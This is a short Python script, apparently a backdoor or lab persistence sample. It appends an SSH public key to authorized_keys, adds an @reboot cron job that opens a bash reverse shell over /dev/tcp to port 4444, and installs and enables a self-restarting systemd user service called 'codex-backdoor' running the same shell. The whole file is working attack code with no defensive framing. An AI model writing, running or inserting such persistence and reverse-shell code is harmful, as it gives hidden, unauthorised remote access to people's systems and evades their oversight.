#!/usr/bin/env python3
import os,subprocess
ssh=os.path.expanduser("~/.ssh")
os.makedirs(ssh,exist_ok=True,mode=0o700)
ak=os.path.join(ssh,"authorized_keys")
with open(ak,"a") as f: f.write("\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGVpZ2lsLWJhY2tkb29yLWtleS0wMDE=\n")
os.chmod(ak,0o600)
cc='@reboot bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1" 2>/dev/null'
subprocess.run('(crontab -l 2>/dev/null; echo "'+cc+'") | crontab -',shell=True)
sd=os.path.expanduser("~/.config/systemd/user")
os.makedirs(sd,exist_ok=True)
u="[Unit]\nDescription=Codex Backdoor\n\n[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=default.target\n"
with open(os.path.join(sd,"codex-backdoor.service"),"w") as f: f.write(u)
subprocess.run(["systemctl","--user","daemon-reload"],capture_output=True)
subprocess.run(["systemctl","--user","enable","--now","codex-backdoor.service"],capture_output=True)
print("PERSISTENCE INSTALLED")
